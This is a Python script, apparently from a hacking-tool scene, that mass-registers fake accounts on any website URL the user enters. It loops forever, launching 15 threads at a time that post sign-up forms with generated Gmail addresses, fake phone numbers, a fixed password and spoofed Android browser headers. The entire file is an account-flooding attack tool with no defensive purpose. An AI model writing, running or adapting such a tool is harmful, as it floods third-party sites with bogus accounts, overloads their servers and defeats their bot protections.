import requests
import threading

# User Input
url = input("Eɴᴛᴇʀ Wᴇʙsɪᴛᴇ URL :- ").strip()
name = input("Eɴᴛᴇʀ Nᴀᴍᴇ :- ").strip()  # Example: ZX ROCK 71
email_prefix = input("Eɴᴛᴇʀ ᴇᴍᴀɪʟ ᴘʀᴇғɪx :- ").strip()  # Example: blackfiretools
email_domain = "gmail.com"  # Fixed domain
password = "123456"  # Fixed password
start_count = 1  # Initial count for email & phone number
request_count = 0  # Track total requests

# Function to create an account
def create_account(count):
    global request_count  # Use global variable

    email = f"{email_prefix}{count}@{email_domain}"  # Generate email
    mobileno = f"016{str(count).zfill(8)}"[:11]  # Ensure 11-digit number

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Android WebView";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': url,
        'upgrade-insecure-requests': '1',
        'x-requested-with': 'com.xbrowser.play',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': url,
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'priority': 'u=0, i'
    }

    data = {
        'name': name,
        'email': email,
        'password': password,
        'mobileno': mobileno,       
        'submit': ''
    }

    response = requests.post(url, headers=headers, data=data)

    if response.status_code == 200:
        request_count += 1  # Increment request count
        print(f"\n Account Created Successfully! ✔️")
        print(f"🔹Nᴀᴍᴇ :- {name}")
        print(f"🔹Eᴍᴀɪʟ :- {email}")
        print(f"🔹Pᴀssᴡᴏʀᴅ :- {password}")
        print(f"🔹Mᴏʙɪʟᴇ Nᴜᴍʙᴇʀ :- {mobileno}")
        print(f"🔹ᴛᴏᴛᴀʟ ʀᴇǫᴜᴇsᴛ :- {request_count}")
        print("-" * 40)
    else:
        print("Fᴀɪʟᴇᴅ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀᴄᴄᴏᴜɴᴛ ❌")

# Multi-threading function
def run_threads(start_count):
    threads = []
    for i in range(start_count, start_count + 15):  # 15 parallel accounts
        thread = threading.Thread(target=create_account, args=(i,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Infinite loop for continuous execution
while True:
    run_threads(start_count)
    start_count += 15